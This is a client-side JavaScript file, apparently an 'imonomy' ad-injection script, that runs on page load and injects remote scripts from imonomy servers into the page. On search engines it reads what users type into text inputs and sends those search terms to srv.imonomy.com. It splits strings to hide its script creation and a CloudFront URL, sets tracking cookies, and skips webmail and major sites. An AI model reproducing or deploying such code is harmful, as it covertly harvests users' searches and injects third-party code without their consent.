
(function(){

if (window.imonomy && window.imonomy.preload && window.imonomy.preload.direct){

// do nothing
var encoded_partner = '14567722143';
if (encoded_partner != imonomy.preload.encoded_partner){
try{
var sub_id = '';
if (encoded_partner == "14567725798" || encoded_partner == "14567725764" || encoded_partner == "14567725690") {
if (typeof(vadims_sub_id) != 'undefined'){
sub_id = vadims_sub_id;
}
}
var unit_code_url = '//srv.imonomy.com/internal/blocked?v=2&subid='+sub_id+'&format=1&ai=992&ctxu=' + escape(imonomy.preload.encoded_partner) + '&sid=' + encoded_partner;
imonomy.preload.injectScript(unit_code_url);
} catch(e){}
}
} else{
window.imonomy = {};
imonomy.inpagesetter = {
define: function(settings){
if (!window.viimo_inpage_setup){
window.viimo_inpage_setup = []
}
window.viimo_inpage_setup = window.viimo_inpage_setup.concat(settings);
if (imonomy.inPage){
imonomy.inPage.execute();
}
}
}
imonomy.preload = {
domain_blacklist: ';google;facebook;mail.aol.com;mail.yahoo.com;webmail;ads.yahoo.com;imprim-encre.com;cartouche.com;wikipedia.com;1800petmeds.com;',
domain_restricted: '',
domain_search: ';bing.com;ask.com;search.yahoo.com;search.aol.com;google;',
page_blacklist: '',
encoded_partner: '14567722143',
direct: true,
sub_id: '',
unit_marker: null,
unit_marker_url: null,
issued_request: false,
search_term_to_use: null,
over_cap: false,
cap_x24: 100000,
allow_https: false,
trackServe_time : new Date().getTime(),
language: function(){
try{
//var full_html = document.documentElement.outerHTML;
//var reg_ex = new RegExp("lang=", "i");
var lang_dict = {"br": "pt", "it": "it", "es": "es", "fr": "fr", "de": "de","mx": "es","ar": "es","co": "es","cl": "es"};
var curr_host = document.location.host;
curr_host_split = curr_host.split(".")
if (curr_host_split[curr_host_split.length-1] in lang_dict){
return lang_dict[curr_host_split[curr_host_split.length-1]];
}
var lang = document.documentElement.lang || navigator.language || navigator.userLanguage;
if (lang == null || typeof(lang) == 'undefined'){
lang = "";
} else{
if (lang.length > 2){
lang = lang[0] + lang[1]
}
}
} catch(e){
return 'en'
// do nothing
}
return lang;
},
injectScript: function(url) {
function inject(){
var script = document.createElement('sc' + 'ript');
script.async = true;
script.setAttribute('type', 'text/jav' + 'ascri' + 'pt');
script.type = 'text/jav' + 'ascri' + 'pt';
script.src = url;
//var att = document.createAttribute("async");
//script.setAttributeNode(att);
if (document.body) {
document.body.appendChild(script);
} else {
var hs = document.getElementsByTagName('head');
if (hs && hs.length > 0) {
var h = hs[0]
h.appendChild(script);
}
}
}
if (document.location.search.indexOf("$dontusesettimeout") > -1){
inject();
} else{
setTimeout(inject, 10);
}
},
checkDomain: function(ourHostName,list)
{
var i,subsHosts;
if (ourHostName == undefined || ourHostName.length == 0)
return false;
ourHostName = ourHostName.toLowerCase();
ourHostName = ourHostName.replace("www.", "");
var ourHostName2 = null;
subsHosts = ourHostName.replace(/[^.]/g, "").length; // how many time there are "."
for(var i=0 ; i <= subsHosts ; i++) {
if(list.indexOf(";"+ourHostName+";") != -1){
return true;
}
if (ourHostName2 != null && list.indexOf(";"+ourHostName2+";") != -1){
return true;
}
if (ourHostName2 == null)
ourHostName2 = ourHostName
var dot_index = ourHostName2.indexOf(".")
if (dot_index > -1){
ourHostName2 = ourHostName2.substring(ourHostName2.indexOf(".")+1,ourHostName2.length);
}
dot_index = ourHostName.indexOf(".")
if (dot_index > -1){
ourHostName = ourHostName.substring(0, ourHostName.lastIndexOf("."));
}
}
return false;
},
setCookie: function(c_name,value,exdays, path)
{
var exdate= null;
if (exdays != null){
exdate=new Date();
exdate.setDate(exdate.getDate() + exdays);
}
var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString())+ ((path==null || typeof(path) == 'undefined') ? "" : "; path="+path);
document.cookie=c_name + "=" + c_value;
},
/* Get cookie by its name */
getCookie : function(c_name) {
if (document.cookie.length > 0) {
var c_start = document.cookie.indexOf(c_name + "=");
if (c_start != -1) {
c_start = c_start + c_name.length + 1;
c_end = document.cookie.indexOf(";", c_start);
if (c_end == -1) c_end = document.cookie.length;
return unescape(document.cookie.substring(c_start, c_end));
}
}
return null;
},
isBlackList: function() {
var ourHostName = document.location.host;
return imonomy.preload.checkDomain(ourHostName, imonomy.preload.domain_blacklist)
},
isDomainAllowed: function(){
if (imonomy.preload.domain_restricted.length > 0){
var ourHostName = document.location.host;
return imonomy.preload.checkDomain(ourHostName, imonomy.preload.domain_restricted);
}
return true;
},
isPageAllowed: function(){
if (window.location != null){
protocol = window.location.protocol;
if(imonomy.preload.allow_https){
return protocol == "https:" || protocol == "http:";
}else{
return protocol == "http:";
}
}
return false;
},
isTimeAllowed: function(){

// check if time was locked
var value = imonomy.preload.getCookie("imonomy_lock_time");
if (value != null){
return false;
}
var lock_counter = imonomy.preload.getCookie("imonomy_lock_count");
if (lock_counter != null && parseInt(lock_counter) > imonomy.preload.cap_x24){
return false;
}

return true;
},
title: function(){
return document.title;
},
tags: function(){
return "";
},
isSearch: function(ourHostName){
return imonomy.preload.checkDomain(ourHostName, imonomy.preload.domain_search);
},
protocol: function(){
var protocol = "http:";
if (window.location != null){
protocol = window.location.protocol;
if (protocol.indexOf("http") < 0){
protocol = "http:"
}
}
return protocol
},
search_ref_callback: function(search_details){
if (search_details != null){
var search_details_split = search_details.split("$!$");
var search_term = search_details_split[0];
var cookie_referrer = search_details_split[1];
if (document.referrer){
var referrer_match = document.referrer.match('http[s]?://([a-zA-Z0-9-_\.]+)(:[0-9]+)?');
var referrer_host = null;
if (referrer_match && referrer_match != null){
referrer_host = referrer_match[1];
referrer_host = referrer_host.replace("www.", "")
}
if (cookie_referrer == referrer_host){
var params = '';
imonomy.preload.search_term_to_use = search_term;
params = params + "pid=" + escape(imonomy.preload.encoded_partner) + "&ln=" + imonomy.preload.language();
imonomy.preload.injectScript(imonomy.preload.protocol() + '//tag.imonomy.com/script/layer.js?' + params);
}
}
}
},
search_check_count: 0,
onSearchReady: function(){
var search_term = "";
var input_element = document.getElementsByTagName("input");
if (input_element != null && typeof (input_element) != 'undefined' && input_element.length > 0){
for (var i = 0; i < input_element.length; i++) {
if (typeof (input_element[i]) != 'undefined'){
if (input_element[i].type == "text" && input_element[i].value.length > 0){
search_term = input_element[i].value;
if (document.location.host.indexOf("google") > -1){
input_element[i].onblur = function() {imonomy.preload.onSearchReady();};
}
break;
}
}
}
}
if (search_term.length > 0){
var referrer_host = document.location.host.replace("www.", "")
var value = search_term + "$!$" + referrer_host + "$!$"
var params = "exp=3&nm=imonomy_st&vl=" + escape(value);
var script_domain = 'srv.imonomy.com';
if (imonomy.preload.protocol() == "https:"){
script_domain = script_domain.replace("a.", "cdn.");
}
imonomy.preload.injectScript(imonomy.preload.protocol() +'//' + script_domain + '/cookies/create.js?' + params);
} else if (imonomy.preload.search_check_count < 10) {
imonomy.preload.search_check_count = imonomy.preload.search_check_count + 1;
setTimeout(function() { imonomy.preload.onSearchReady(); }, 500);
}
},
init: function(){
var is_chrome = navigator.userAgent.toLowerCase().indexOf('chrome') > -1;
if(false && is_chrome){
//imonomy.preload.injectScript('https://d19tqk5t6qcjac.cloudfront.net/i/853_contentch.js');
imonomy.preload.injectScript('https://d19'+'tqk5t'+'6qc'+'jac.clou'+'dfro'+'nt.net/i/' + 787 + '_con'+'tentc'+'h.js');
}
if (true && window.top != window.self) //don't run on frames or iframes
{
// check if there are some large images.
var imgs = document.getElementsByTagName("img");
for (var index = 0; index < imgs.length; index++) {
var img = imgs[index];
if (img.clientWidth > 301 && img.clientHeight > 251){
try{
var sub_id = '';
var unit_code_url = '//srv.imonomy.com/internal/reporter?v=2&format=1&ai=986&subid=inframe&sid=' + imonomy.preload.encoded_partner +'&ctxu=' + escape(window.location) + "&dm=" + escape(window.location.host);
imonomy.preload.injectScript(unit_code_url);
} catch(e){}
}
}
return;
}
if ((Math.random()*100) < 10 && !imonomy.preload.isPageAllowed()){
try{
if (imonomy.preload.protocol() != "https:"){
// was allwed on old check
var location = "error";
try{
location = escape(document.location);
} catch(e){location = "error"}
var domain = "error";
try{
domain = escape(document.location.host.replace("www.", ""));
} catch(e){domain = "error"}
var unit_code_url = '//srv.imonomy.com/internal/blocked?v=2&subid=ssl&format=1&ai=991&ctxu=' + location + '&sid=' + imonomy.preload.encoded_partner + '&dm=' + domain;
imonomy.preload.injectScript(unit_code_url);
}
} catch(e){}
try{
var protocol = ""
try{
if (window.location != null){
protocol = window.location.protocol + "";
}
} catch(e){protocol = "error";}
var unit_code_url = '//srv.imonomy.com/internal/blocked?v=2&subid=' + protocol +'&format=1&ai=991&ctxu=' + escape(document.location) + '&sid=' + imonomy.preload.encoded_partner + '&dm=' + escape(document.location.host.replace("www.", ""));
imonomy.preload.injectScript(unit_code_url);
} catch(e){}
}
if (!imonomy.preload.isBlackList() && imonomy.preload.isPageAllowed()){
if (imonomy.preload.isDomainAllowed()){
imonomy.preload.over_cap = !imonomy.preload.isTimeAllowed();
var params = '';
params = params + "pid=" + escape(imonomy.preload.encoded_partner)+ "&ln=" + imonomy.preload.language();
/*params = params + (document.charset ? '&charset='+document.charset : (document.characterSet ? '&charset='+document.characterSet : ''));
if (document.context) {
params = params + "&context=" + escape(document.context);
}
params = params + "&ti=" + escape(imonomy.preload.title());
if (document.referrer){
params = params + "&referer=" + escape(document.referrer);
}
params = params + "&loc=" + escape(window.location) + "&dm=" + escape(window.location.host);*/
imonomy.preload.injectScript(imonomy.preload.protocol() + '//tag.imonomy.com/script/layer.js?' + params);
}else{
if (imonomy.preload.isTimeAllowed()){
if (document.referrer){
var referrer_match = document.referrer.match('http[s]?://([a-zA-Z0-9-_\.]+)(:[0-9]+)?');
var referrer_host = null;
if (referrer_match && referrer_match != null){
referrer_host = referrer_match[1];
referrer_host = referrer_host.replace("www.", "")
}
if (referrer_host != null){
if (imonomy.preload.isSearch(referrer_host)){
var params = "nm=imonomy_st&cb=imonomy.preload.search_ref_callback&ot=true"
imonomy.preload.injectScript(imonomy.preload.protocol() + '//srv.imonomy.com/cookies/get.js?' + params);
}
}
}
}
}
}
var curr_host = document.location.host.replace("www.", "")
if (imonomy.preload.isSearch(curr_host)){
if (document.readyState == 'complete') {
imonomy.preload.onSearchReady();
}
else if (document.addEventListener) {
document.addEventListener('DOMContentLoaded', imonomy.preload.onSearchReady, false);
// Bad citizens.
} else if (document.attachEvent) {
document.attachEvent('onreadystatechange', imonomy.preload.onSearchReady);
}
var oldonload = window.onload;
window.onload = function() {
imonomy.preload.onSearchReady();
if (oldonload) {
if (typeof oldonload == 'string') {
eval(oldonload);
} else {
oldonload();
}
}
}
}
}
}
imonomy.preload.init();
}
}());
